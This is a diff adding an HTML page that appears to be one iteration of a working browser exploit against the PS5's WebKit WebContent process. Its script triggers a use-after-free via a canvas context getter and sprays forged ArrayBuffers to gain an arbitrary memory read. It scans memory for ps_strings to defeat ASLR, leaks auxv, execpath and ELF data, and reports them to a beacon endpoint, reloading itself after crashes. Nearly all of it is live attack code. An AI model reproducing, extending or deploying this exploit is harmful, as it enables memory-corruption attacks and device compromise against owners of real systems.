@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V922 - user-space width scan for ps_strings</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V922 - user-space width scan for ps_strings</h1>
+
+<p class="key">
+<b>V921 disproved the LA48 anchor:</b> <code>0x7fffffffe000</code>, <code>0x7fffffffefe0</code>,
+<code>0x7fffffffdfe0</code>, <code>0x7fffffffd000</code> all crashed. The PS5 WebContent process is not
+using the standard 48-bit top-of-user-space layout. This probe walks the usual user-space widths
+(<code>max = 2^(n-1)</code>) and reads <b>ps_strings</b> at <code>max - 0x1020</code>
+(stage 1), then the lowered-shared-page variant at <code>max - 0x2020</code> (stage 2).
+Read primitive is unchanged: <code>lineWidth = *(m_buffer + (m_size-1)*400 + 48)</code>.
+A surviving read at ps_strings = ASLR defeated.
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k) { try { return window.localStorage.getItem('v922_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v922_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v922_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V922-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+var F64 = new Float64Array(1), U32 = new Uint32Array(F64.buffer);
+function hexOf(x) { F64[0] = x; return '0x' + ('00000000' + U32[1].toString(16)).slice(-8) + ('00000000' + U32[0].toString(16)).slice(-8); }
+function bits(x) { F64[0] = x; return { hi: U32[1] >>> 0, lo: U32[0] >>> 0 }; }
+function hexAddr(a) { return '0x' + Math.floor(a).toString(16); }
+function ptrOf(b) { return b.hi * 0x100000000 + b.lo; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 60) : 'none'; }
+
+/* candidate user-space widths: max = 2^(n-1).
+   n=36 is skipped because 2^35 = 0x800000000 is below the known libWebKit range.
+   sorted by likelihood for a Sony FreeBSD fork. */
+var WIDTHS = [39, 40, 38, 37, 42, 41, 43, 44, 45, 46, 47, 48, 57];
+
+var VIEWS = null, KEEP = null, CTX = null, TAGMADE = 0;
+
+/* ---------- UAF trigger (same shape as V906/V919/V920/V921) ---------- */
+function trigger(canvas, nsaves) {
+  var saved = null;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try {
+        ctx.lineWidth = 3.14159;
+        ctx.miterLimit = 7.77;
+        ctx.globalAlpha = 0.42;
+        ctx.lineDashOffset = 2.222;
+        ctx.shadowBlur = 5.55;
+        for (var s = 0; s < nsaves; s++) ctx.save();
+        ctx.lineWidth = 1.0;
+      } catch (e) {}
+      return true;
+    }
+  });
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, bmp: bmp };
+}
+
+/* ---------- forge / read ---------- */
+function sprayForge(count) {
+  var abs = new Array(count);
+  VIEWS = new Array(count);
+  for (var i = 0; i < count; i++) {
+    var ab = new ArrayBuffer(768);
+    VIEWS[i] = new Uint32Array(ab);
+    abs[i] = ab;
+  }
+  KEEP = abs;
+}
+function forge(addr, k) {
+  var lo = addr % 0x100000000;
+  var hi = Math.floor(addr / 0x100000000);
+  for (var i = 0; i < VIEWS.length; i++) {
+    var v = VIEWS[i];
+    v[28] = lo;   /* +112 m_buffer lo */
+    v[29] = hi;   /* +116 m_buffer hi */
+    v[30] = k;    /* +120 m_size     */
+    v[31] = k;    /* +124 m_capacity */
+  }
+}
+function rd(addr) {
+  forge(addr - 48, 1);
+  lsSet('pending', hexAddr(addr));
+  var v = CTX.lineWidth;
+  lsDel('pending');
+  return v;
+}
+
+/* ---------- MISS detector ---------- */
+function tagContexts(n) {
+  var keep = [], made = 0;
+  for (var c = 0; c < n; c++) {
+    var cc = document.createElement('canvas');
+    cc.width = 1; cc.height = 1;
+    var cx = null;
+    try { cx = cc.getContext('2d'); } catch (e) {}
+    if (cx) { try { cx.lineWidth = 200 + made; } catch (e2) {} keep.push(cc); made++; }
+  }
+  return { keep: keep, made: made };
+}
+function isTag(v) { return (typeof v === 'number' && v >= 200 && v < 200 + TAGMADE); }
+
+/* ---------- crash bookkeeping with per-address retry ---------- */
+function bads() {
+  try { var a = JSON.parse(lsGet('bad') || '[]'); return (a instanceof Array) ? a : []; }
+  catch (e) { return []; }
+}
+function addBad(a) {
+  var b = bads();
+  if (b.indexOf(a) < 0) { b.push(a); lsSet('bad', JSON.stringify(b)); }
+}
+function triesOf() {
+  try { var t = JSON.parse(lsGet('tries') || '{}'); return (t && typeof t === 'object') ? t : {}; }
+  catch (e) { return {}; }
+}
+function bumpTry(a) {
+  var t = triesOf(), k = hexAddr(a);
+  t[k] = (t[k] || 0) + 1;
+  lsSet('tries', JSON.stringify(t));
+  return t[k];
+}
+function clearTry(a) {
+  var t = triesOf(), k = hexAddr(a);
+  if (t[k]) { delete t[k]; lsSet('tries', JSON.stringify(t)); }
+}
+
+/* ---------- ps_strings pattern (relaxed, width-agnostic) ---------- */
+function isPS(q, c) {
+  var b0 = bits(q[0]), b1 = bits(q[1]), b2 = bits(q[2]), b3 = bits(q[3]);
+  if ((b0.hi | b0.lo) === 0) return false;
+  if ((b2.hi | b2.lo) === 0) return false;
+  var argv = ptrOf(b0), env = ptrOf(b2), argc = b1.lo, envc = b3.lo;
+  if (argc > 4096 || envc > 65536) return false;
+  if (argv < 0x1000 || argv >= c) return false;
+  if (c - argv > 0x10000000) return false;
+  if (env !== argv + (argc + 1) * 8) return false;
+  if (env + (envc + 1) * 8 >= c) return false;
+  return true;
+}
+
+/* ---------- auxv / execpath / elf walk once ps_strings is known ---------- */
+function asciiFromQ(q) {
+  var out = '';
+  for (var k = 0; k < q.length; k++) {
+    var b = bits(q[k]);
+    var arr = [b.lo & 0xff, (b.lo >>> 8) & 0xff, (b.lo >>> 16) & 0xff, (b.lo >>> 24) & 0xff,
+               b.hi & 0xff, (b.hi >>> 8) & 0xff, (b.hi >>> 16) & 0xff, (b.hi >>> 24) & 0xff];
+    for (var j = 0; j < 8; j++) {
+      var ch = arr[j];
+      if (ch === 0) return out;
+      out += (ch >= 32 && ch < 127) ? String.fromCharCode(ch) : '.';
+    }
+  }
+  return out;
+}
+
+function leakFrom(anchor) {
+  function guarded(addr) {
+    if (bads().indexOf(addr) >= 0) return null;
+    try { var v = rd(addr); clearTry(addr); return v; }
+    catch (e) { return null; }
+  }
+
+  /* 1) ps_strings itself */
+  var q0 = guarded(anchor), q1 = guarded(anchor + 8), q2 = guarded(anchor + 16), q3 = guarded(anchor + 24);
+  if (q0 === null || q1 === null || q2 === null || q3 === null) {
+    bks('PART', 'anchor=' + hexAddr(anchor) + ',bad=' + JSON.stringify(bads()).slice(0, 200));
+    return false;
+  }
+  if (isTag(q0)) { bks('MISS', 'leak,tag=' + q0); return false; }
+  var b0 = bits(q0), b1 = bits(q1), b2 = bits(q2), b3 = bits(q3);
+  var argv = ptrOf(b0), argc = b1.lo, env = ptrOf(b2), envc = b3.lo;
+  bks('PS', 'a=' + hexAddr(anchor) + ',q0=' + hexOf(q0) + ',q1=' + hexOf(q1) +
+            ',q2=' + hexOf(q2) + ',q3=' + hexOf(q3) + ',argv=' + hexAddr(argv) +
+            ',argc=' + argc + ',env=' + hexAddr(env) + ',envc=' + envc);
+  say('PS at ' + hexAddr(anchor) + ' argv=' + hexAddr(argv) + ' argc=' + argc + ' env=' + hexAddr(env) + ' envc=' + envc);
+
+  if (!isPS([q0, q1, q2, q3], anchor)) {
+    bks('NOPAT', 'a=' + hexAddr(anchor));
+    return false;
+  }
+
+  /* 2) auxv = env + (envc+1)*8 */
+  var aux = env + (envc + 1) * 8;
+  var Q = [], i;
+  for (i = 0; i < 74; i++) {
+    var a = aux + i * 8;
+    if (bads().indexOf(a) >= 0) { Q.push(null); continue; }
+    try { Q.push(rd(a)); clearTry(a); } catch (e) { Q.push(null); }
+  }
+  var s = '', sum = '', epPtr = null, phdr = null, phent = null, phnum = null;
+  for (i = 0; i < 37; i++) {
+    var tv = Q[2 * i], vv = Q[2 * i + 1];
+    if (tv === null || vv === null) break;
+    var tag = Math.round(tv);
+    if (!isFinite(tag) || tag < 0 || tag > 0xffff) break;
+    s += tag.toString(16) + ':' + hexOf(vv) + ' ';
+    if (tag === 0) break;
+    if (tag === 3) phdr = vv;
+    if (tag === 4) phent = Math.round(vv);
+    if (tag === 5) phnum = Math.round(vv);
+    if (tag === 15) epPtr = ptrOf(bits(vv));
+    if (tag === 3 || tag === 7 || tag === 9 || tag === 15) sum += 'AT' + tag + '=' + hexOf(vv) + ',';
+  }
+  bks('AUX', s.slice(0, 440));
+  bks('SUM', sum + 'phent=' + (phent === null ? '?' : phent) + ',phnum=' + (phnum === null ? '?' : phnum));
+
+  /* 3) execpath */
+  if (epPtr && epPtr > 0x1000) {
+    var ep = '';
+    for (var j = 0; j < 8; j++) {
+      var ea = epPtr + j * 8;
+      if (bads().indexOf(ea) >= 0) break;
+      try { ep += asciiFromQ([rd(ea)]); } catch (e) { break; }
+    }
+    bks('EXECPATH', hexAddr(epPtr) + ' ' + ep);
+  }
+
+  /* 4) ELF header near AT_PHDR */
+  if (phdr && phent) {
+    try {
+      var phI = ptrOf(bits(phdr));
+      var e0 = rd(phI & ~0xfff), e1 = rd(phI - 0x40);
+      bks('ELF', 'phdr=' + hexAddr(phI) + ',page=' + hexOf(e0) + ',p40=' + hexOf(e1));
+    } catch (e) {}
+  }
+
+  bks('FOUND', 'anchor=' + hexAddr(anchor));
+  return true;
+}
+
+function reloadSoon(ms) { setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, ms); }
+
+/* ---------- probe one ps_strings candidate ---------- */
+/* returns 'found' | 'survived' | 'crashed-handled' */
+function probePS(addr, w, tagName) {
+  if (bads().indexOf(addr) >= 0) return 'bad';
+
+  lsSet('pkind', tagName);
+  var t = parseInt(triesOf()[hexAddr(addr)] || '0', 10) + 1;
+  bks('TRY', 'w=' + w + ',' + tagName + ',a=' + hexAddr(addr) + ',t=' + t);
+  say('trying ' + tagName + ' width=' + w + ' @ ' + hexAddr(addr));
+
+  var v;
+  try { v = rd(addr); } catch (e) { bks('ERR', 'rd:' + errOf(e)); return 'err'; }
+  clearTry(addr);
+
+  if (isTag(v)) { bks('MISS', tagName + ',w=' + w + ',tag=' + v); reloadSoon(2500); return 'miss'; }
+
+  /* survived: dump 4 qwords (never crosses the page end), then test pattern */
+  var q4 = [v];
+  for (var ki = 1; ki < 4; ki++) {
+    try { q4.push(rd(addr + ki * 8)); } catch (e) { q4.push(null); break; }
+  }
+  var hx = q4.map(function (x) { return x === null ? '?' : hexOf(x); }).join(',');
+  bks('RAW', 'w=' + w + ',' + tagName + ',a=' + hexAddr(addr) + ',' + hx);
+  say('RAW ' + tagName + ' w=' + w + ' ' + hx);
+
+  if (q4[1] !== null && q4[2] !== null && q4[3] !== null && isPS([q4[0], q4[1], q4[2], q4[3]], addr)) {
+    lsSet('found', hexAddr(addr));
+    bks('FOUND', 'w=' + w + ',' + tagName + ',a=' + hexAddr(addr));
+    say('PS_STRINGS FOUND at ' + hexAddr(addr) + ' (width ' + w + ')');
+    leakFrom(addr);
+    lsSet('phase', 'done');
+    return 'found';
+  }
+
+  /* page survived but pattern is not at the expected offset: scan the whole page.
+     every byte inside this page is mapped, so this cannot fault. */
+  var pgBase = Math.floor(addr / 0x1000) * 0x1000;
+  var hit = null;
+  for (var off = 0; off <= 0xfe0 && !hit; off += 8) {
+    var a2 = pgBase + off;
+    var z0;
+    try { z0 = rd(a2); } catch (e) { break; }
+    var zb = bits(z0);
+    if ((zb.hi | zb.lo) === 0) continue;
+    var z2;
+    try { z2 = rd(a2 + 16); } catch (e) { break; }
+    if ((bits(z2).hi | bits(z2).lo) === 0) continue;
+    var z1 = rd(a2 + 8), z3 = rd(a2 + 24);
+    if (isPS([z0, z1, z2, z3], a2)) hit = a2;
+  }
+  bks('PSSCAN', 'page=' + hexAddr(pgBase) + ',hit=' + (hit ? hexAddr(hit) : 'no'));
+  if (hit !== null) {
+    lsSet('found', hexAddr(hit));
+    bks('FOUND', 'w=' + w + ',scan,a=' + hexAddr(hit));
+    say('PS_STRINGS FOUND by page scan at ' + hexAddr(hit) + ' (width ' + w + ')');
+    leakFrom(hit);
+    lsSet('phase', 'done');
+    return 'found';
+  }
+
+  return 'survived';
+}
+
+/* ---------- stage scan: n = normal top, l = lowered shared page ---------- */
+function stageScan(stage) {
+  var bad = bads();
+  for (var wi = 0; wi < WIDTHS.length; wi++) {
+    var w = WIDTHS[wi];
+    var max = Math.pow(2, w - 1);
+    var addr = (stage === 'l') ? (max - 0x2020) : (max - 0x1020);
+    if (bad.indexOf(addr) >= 0) continue;
+    var r = probePS(addr, w, stage === 'l' ? 'psL' : 'ps');
+    if (r === 'found' || r === 'miss' || r === 'err') return;
+    /* r === 'survived' means the page was mapped but had no ps pattern;
+       keep scanning the remaining widths in the same load. */
+  }
+  /* every address in this stage is either blacklisted or survived without a hit */
+  if (stage === 'n') {
+    lsSet('stage', 'l');
+    bks('STAGE', 'n done -> l');
+    say('stage n done, moving to stage l');
+    stageScan('l');
+    return;
+  }
+  bks('EXHAUSTED', 'bad=' + JSON.stringify(bads()).slice(0, 340));
+  say('all widths exhausted - see beacons');
+  lsSet('phase', 'done');
+}
+
+function reloadSoon2() { reloadSoon(2500); }
+
+/* ---------- main ---------- */
+function main() {
+  var q = location.search;
+
+  if (q.indexOf('reset=1') >= 0) {
+    lsDel('pending'); lsDel('bad'); lsDel('loads'); lsDel('tries');
+    lsDel('found'); lsDel('stage'); lsDel('pkind'); lsDel('phase');
+    bks('RESET', 'cleared');
+    say('cleared. reopen ?op=auto');
+    return;
+  }
+
+  var loads = parseInt(lsGet('loads') || '0', 10) + 1;
+  lsSet('loads', loads);
+  if (loads > 400) {
+    bks('GIVEUP', 'loads=' + loads + ',bad=' + JSON.stringify(bads()).slice(0, 300));
+    say('too many loads - reopen with ?reset=1');
+    return;
+  }
+
+  var pend = lsGet('pending');
+  if (pend) {
+    lsDel('pending');
+    var pa = parseInt(pend, 16);
+    var n = bumpTry(pa);
+    var kind = lsGet('pkind') || '?';
+    lsDel('pkind');
+    bks('CRASH', 'addr=' + pend + ',kind=' + kind + ',try=' + n);
+    if (n >= 2) { addBad(pa); say('crash ' + pend + ' (' + kind + ', final, blacklisted)'); }
+    else say('crash ' + pend + ' (' + kind + ', retry ' + n + ')');
+  }
+
+  bks('BOOT', 'load=' + loads + ',stage=' + (lsGet('stage') || 'n') +
+              ',found=' + (lsGet('found') || '-') + ',bad=' + bads().length);
+
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas);
+  window._v922canvas = canvas;
+
+  var t = trigger(canvas, 32);
+  if (!t.saved) { bks('ERR', 'trigger-failed'); say('trigger failed - reopening'); reloadSoon(1500); return; }
+  CTX = t.saved;
+
+  sprayForge(400);
+  var tk = tagContexts(8);
+  TAGMADE = tk.made;
+  bks('ARM', 'abs=400,tag=' + TAGMADE);
+
+  var f = lsGet('found');
+  if (f) {
+    say('resuming leak from ' + f);
+    if (leakFrom(parseInt(f, 16))) { lsSet('phase', 'done'); }
+    else { say('leak incomplete - reopening'); reloadSoon2(); }
+    return;
+  }
+
+  var stage = lsGet('stage') || 'n';
+  stageScan(stage);
+}
+
+try { main(); } catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 200)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
